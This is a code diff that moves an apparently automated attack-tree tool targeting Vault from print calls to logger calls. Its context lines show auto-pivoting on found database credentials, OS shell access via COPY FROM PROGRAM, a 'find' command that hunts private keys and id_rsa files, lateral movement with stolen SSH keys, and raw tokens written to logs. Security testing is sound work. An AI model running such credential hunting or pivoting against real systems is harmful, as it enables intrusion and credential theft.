@@ -24,6 +24,7 @@ from dataclasses import dataclass, field
 from datetime import datetime
 from enum import Enum
 from typing import Any, Callable
+from core.logger import logger
 
 
 # ---------------------------------------------------------------------------
@@ -389,10 +390,10 @@ class TreeWalker:
                 max_branches=4,
             )
             if new_branches:
-                print(f"       [>>] Dynamic update: {len(new_branches)} new branches injected "
+                logger.info(f"       [>>] Dynamic update: {len(new_branches)} new branches injected "
                       f"({len(significant)} discoveries)", flush=True)
         except Exception as exc:
-            print(f"       [!] Dynamic branch injection failed: {exc}", flush=True)
+            logger.info(f"       [!] Dynamic branch injection failed: {exc}", flush=True)
 
     # ── internal walk logic ─────────────────────────────────────────────────
 
@@ -411,10 +412,10 @@ class TreeWalker:
         if self._aborted:
             return
         if self._total_steps >= self._max_total_steps:
-            print("[!] Tree walker: max total steps reached.")
+            logger.warning("[!] Tree walker: max total steps reached.")
             return
         if self._current_depth > self._max_depth:
-            print("[!] Tree walker: max recursion depth reached.")
+            logger.warning("[!] Tree walker: max recursion depth reached.")
             return
 
         # ── 1. Execute node if it's a real tool ─────────────────────────
@@ -455,7 +456,7 @@ class TreeWalker:
                 self._current_depth += 1
 
                 if mutation_engine and self._current_depth <= self._max_depth:
-                    print(f"\n  *** RECURSIVE ESCALATION (level {self._current_depth}) ***")
+                    logger.info(f"\n  *** RECURSIVE ESCALATION (level {self._current_depth}) ***")
                     new_root = self._regenerate_tree(
                         mutation_engine, child, vault_addr
                     )
@@ -507,9 +508,9 @@ class TreeWalker:
             self._failed.key(node.tool, node.params), 0
         ) + 1
 
-        print(f"\n  [{attempt}/2] [{node.risk.value if hasattr(node.risk, 'value') else node.risk}] {node.tool}")
+        logger.info(f"\n  [{attempt}/2] [{node.risk.value if hasattr(node.risk, 'value') else node.risk}] {node.tool}")
         if node.reason:
-            print(f"       Reason: {node.reason[:120]}")
+            logger.info(f"       Reason: {node.reason[:120]}")
 
         try:
             params = dict(node.params) if node.params else {}
@@ -575,7 +576,7 @@ class TreeWalker:
                 self._total_steps += 1
 
                 if remaining == 0:
-                    print(f"       [!] Blacklisted — 2 failures reached.")
+                    logger.info(f"       [!] Blacklisted — 2 failures reached.")
 
                 return False
 
@@ -626,7 +627,7 @@ class TreeWalker:
         if not hasattr(self, '_pivoted'):
             self._pivoted: set[str] = set()
 
-        print(f"\n       [>] DB credentials found — auto-pivoting...")
+        logger.info(f"\n       [>] DB credentials found — auto-pivoting...")
         self._pivoted.add(pivot_key)
 
         # Execute pivot engine directly
@@ -652,7 +653,7 @@ class TreeWalker:
                                     "find / -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -5"],
                 })
 
-                print(f"       [<] Pivot: {pivot_result.status} — {pivot_result.message[:100]}")
+                logger.info(f"       [<] Pivot: {pivot_result.status} — {pivot_result.message[:100]}")
 
                 # If pivot succeeded with OS shell, add post-exploit branches to the tree
                 evidence = pivot_result.evidence or {}
@@ -677,7 +678,7 @@ class TreeWalker:
 
                 return True
         except Exception as exc:
-            print(f"       [!] Pivot failed: {exc}")
+            logger.info(f"       [!] Pivot failed: {exc}")
             return False
 
         return False
@@ -692,7 +693,7 @@ class TreeWalker:
         outputs = shell_info.get("command_outputs", {})
         method = shell_info.get("method", "COPY FROM PROGRAM")
 
-        print(f"       [!] OS Shell on {host} via {method} — adding post-exploit branches")
+        logger.info(f"       [!] OS Shell on {host} via {method} — adding post-exploit branches")
 
         # Read Vault data from filesystem
         self.add_branch_to_node(
@@ -716,7 +717,7 @@ class TreeWalker:
             expected_outcome="Lateral movement via stolen SSH keys",
         )
 
-        print(f"       [*] {2} post-exploit branches added to attack tree")
+        logger.info(f"       [*] {2} post-exploit branches added to attack tree")
 
     def add_branch_to_node(
         self, parent: Any, tool: str, reason: str,
@@ -814,7 +815,7 @@ class TreeWalker:
 
                     rec = global_store.add_token(token, source=f"tree_walk:{tool}", power_level=power)
                     if rec:
-                        print(f"       [+] New token: {power} ({token})")
+                        logger.info(f"       [+] New token: {power} ({token})")
 
                 # Check if we escalated
                 new_best = global_store.get_best_token_value()
@@ -824,7 +825,7 @@ class TreeWalker:
                 if new_best and new_best != prev_best:
                     if POWER_RANK.get(new_power, 0) > POWER_RANK.get(prev_power, 0):
                         escalated = True
-                        print(f"       [!] ESCALATED: {prev_power} -> {new_power}")
+                        logger.info(f"       [!] ESCALATED: {prev_power} -> {new_power}")
             except ImportError:
                 pass
 
@@ -858,9 +859,9 @@ class TreeWalker:
                 findings=state.get("findings", []),
                 vault_addr=vault_addr,
             )
-            print(f"       [*] Mutation generated {len(mutation.branches)} new branches")
+            logger.info(f"       [*] Mutation generated {len(mutation.branches)} new branches")
         except Exception as exc:
-            print(f"       [!] Mutation request failed: {exc}")
+            logger.info(f"       [!] Mutation request failed: {exc}")
 
     def _regenerate_tree(
         self, mutation_engine: Any, escalation_node: Any, vault_addr: str,
@@ -875,10 +876,10 @@ class TreeWalker:
                 "credential_count": state["total_credentials"],
             }
             new_root = mutation_engine.start_tree(vault_addr, assets)
-            print(f"       [*] Regenerated attack tree with {assets['best_power']} privileges")
+            logger.info(f"       [*] Regenerated attack tree with {assets['best_power']} privileges")
             return new_root
         except Exception as exc:
-            print(f"       [!] Tree regeneration failed: {exc}")
+            logger.info(f"       [!] Tree regeneration failed: {exc}")
             return None
 
     # ── helpers ─────────────────────────────────────────────────────────────
